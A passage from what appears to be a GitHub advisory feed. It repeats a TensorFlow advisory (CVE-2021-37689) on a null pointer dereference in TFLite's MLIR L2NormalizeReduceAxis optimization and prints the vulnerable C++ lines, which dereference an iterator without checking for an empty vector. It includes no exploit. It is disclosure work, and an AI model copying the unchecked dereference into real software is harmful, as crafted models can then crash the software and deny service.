<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>
<pre><code class="language-cc">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==
          *axis.getValues&lt;int&gt;().begin() ||
      *axis.getValues&lt;int&gt;().begin() == -1) {
      // ...
  }
  // ...
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-37689">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T14:39:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tensorflow] Null pointer dereference in TFLite MLIR optimizations]]></title>
        <id>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</id>
        <link href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh"/>
        <updated>2024-08-29T22:06:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>
<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>
<pre><code class="language-cc">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {
  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==
          *axis.getValues&lt;int&gt;().begin() ||
      *axis.getValues&lt;int&gt;().begin() == -1) {
      // ...
  }
  // ...
}
</code></pre>
<h3 id="patches">Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>
<h3 id="for-more-information">For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3 id="attribution">Attribution</h3>
<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-37689">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>
<li><a href="https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>
<li><a href="https://github.com/advisories/GHSA-wf5p-c75w-w3wh">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wf5p-c75w-w3wh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-08-25T14:39:36.000Z</published>
    </entry>
</feed>